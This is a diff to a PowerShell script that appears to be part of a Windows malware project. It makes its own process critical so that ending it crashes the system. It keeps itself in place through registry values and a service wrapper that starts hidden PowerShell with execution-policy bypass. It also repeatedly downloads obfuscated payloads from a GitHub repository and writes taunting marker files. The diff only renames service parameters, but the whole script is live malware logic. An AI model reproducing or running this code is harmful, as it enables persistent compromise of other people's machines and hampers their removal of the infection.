@@ -1,6 +1,8 @@
 param(
     [string]$basePath,
-    [string]$exe
+    [string]$exe,
+    [string]$childServiceName,
+    [string]$childServicePropertyName
 )
 
 Start-Process powershell.exe -ArgumentList "-Command `"whoami >> C:\whoami_fwd.txt`""
@@ -14,9 +16,9 @@ $paths = @(
 )
 $b = $basePath -replace '([\\{}])', '`$1'
 
-$serviceName = "MyfwdService"
-$propertyName = "fwd"
-$regPath = "HKLM:\SYSTEM\CurrentControlSet\Services\$serviceName"
+
+
+$regPath = "HKLM:\SYSTEM\CurrentControlSet\Services\$childServiceName"
 $initServicefwdPath = $paths[$(Get-Random -Minimum 0 -Maximum $paths.Length)]
 $initServicefwdPath = "$initServicefwdPath\init_service_fwd.ps1"
 $fwdName = "f.ps1"
@@ -33,18 +35,18 @@ public class CS {
 Add-Type -TypeDefinition $signature
 [CS]::RtlSetProcessIsCritical(1, 0, 0) | Out-Null
 
-$item = Get-ItemProperty -Path "$basePath" -Name $propertyName -ErrorAction SilentlyContinue
+$item = Get-ItemProperty -Path "$basePath" -Name $childServicePropertyName -ErrorAction SilentlyContinue
 $issetup = $false
 
 if(-not($item)){
     $fwdPath = $paths[$(Get-Random -Minimum 0 -Maximum $paths.Length)]
     $fwdPath = "$fwdPath\$fwdName"
-    New-ItemProperty -Path "$basePath" -Name $propertyName -Value $fwdPath -Force | Out-Null
+    New-ItemProperty -Path "$basePath" -Name $childServicePropertyName -Value $fwdPath -Force | Out-Null
     $issetup = $true
 }
 
 else{
-    $fwdPath = $item.$propertyName
+    $fwdPath = $item.$childServicePropertyName
     $issetup = $false
 }
 
@@ -83,17 +85,17 @@ function Get-ServiceName{
 
 while ($true) {
     $x = Get-ServiceReg -path $regPath
-    $y = Get-ServiceName -name $serviceName
+    $y = Get-ServiceName -name $childServiceName
     if((Test-Path -Path "$env:temp\_ready.lock" -PathType Leaf) -and (Test-Path -Path "$env:temp\jMEmdVuJAtNea.txt" -PathType Leaf)){
         $fwdName = Get-Content -Path "$env:temp\jMEmdVuJAtNea.txt"
         $fwdName = $fwdName.Trim()
+        Remove-Item -Path "$env:temp\jMEmdVuJAtNea.txt" -Force
         if($null -ne $fwdName -and $fwdName -ne ""){
             $fwdPath = "$([System.IO.Path]::GetDirectoryName($fwdPath))\$fwdName"
             $arg = "-ep bypass -nop -w hidden $fwdPath"
             & $exe set "MyfwdService" AppParameters $arg
-            Set-ItemProperty -Path "$basePath" -Name $propertyName -Value $fwdPath -Force | Out-Null
+            Set-ItemProperty -Path "$basePath" -Name $childServicePropertyName -Value $fwdPath -Force | Out-Null
             Remove-Item -Path "$env:temp\_ready.lock" -Force
-            Remove-Item -Path "$env:temp\jMEmdVuJAtNea.txt" -Force
             echo "GET LAID WINDOWS DF XD" >> "C:\LAID.txt"
         }
     }
@@ -103,7 +105,7 @@ while ($true) {
             $initServicefwdPath = "$initServicefwdPath\init_service_fwd.ps1"
             $fwdPath = $paths[$(Get-Random -Minimum 0 -Maximum $paths.Length)]
             $fwdPath = "$fwdPath\$fwdName"
-            Set-ItemProperty -Path "$basePath" -Name $propertyName -Value $fwdPath -Force | Out-Null
+            Set-ItemProperty -Path "$basePath" -Name $childServicePropertyName -Value $fwdPath -Force | Out-Null
         }
         iwr -Uri "https://github.com/Soumyo001/progressive_0verload/raw/refs/heads/main/obfuscated%20payloads/f.ps1" -OutFile $fwdPath
         iwr -Uri "https://github.com/Soumyo001/progressive_0verload/raw/refs/heads/main/payloads/init_service_fwd.ps1" -OutFile $initServicefwdPath
